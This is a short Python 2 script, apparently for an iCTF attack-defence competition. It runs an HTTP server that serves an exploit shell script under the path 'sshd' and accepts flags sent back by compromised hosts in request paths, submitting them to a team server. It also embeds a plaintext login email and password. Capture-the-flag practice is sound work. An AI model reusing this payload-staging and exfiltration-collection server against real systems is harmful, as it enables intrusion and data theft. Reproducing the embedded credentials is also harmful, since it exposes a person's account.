from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
from ictf import iCTF

# Server config
HOST=''
PORT=8888

# Login config
TEAM_SERVER='http://35.160.215.67/'
USER='surajshah525@gmail.com'
PASS='2cZXX5C6bBMq'

# Exploit File
FILE='./ff.sh'

# Submit Server
server=None

class GetHandler(BaseHTTPRequestHandler):
	def do_GET(self):
		path = self.path.lstrip('/')
		if path == 'sshd':
			with open(FILE, 'rb') as f:
				self.wfile.write(f.read())
		if path.startswith('FLG'):
			flags = path.split('/')
			print flags
			server.submit_flag(flags)

def run():
	global server
	i = iCTF(TEAM_SERVER)
	server = i.login(USER, PASS)
	server_address = (HOST, PORT)
	httpd = HTTPServer(server_address, GetHandler)
	httpd.serve_forever()

run()
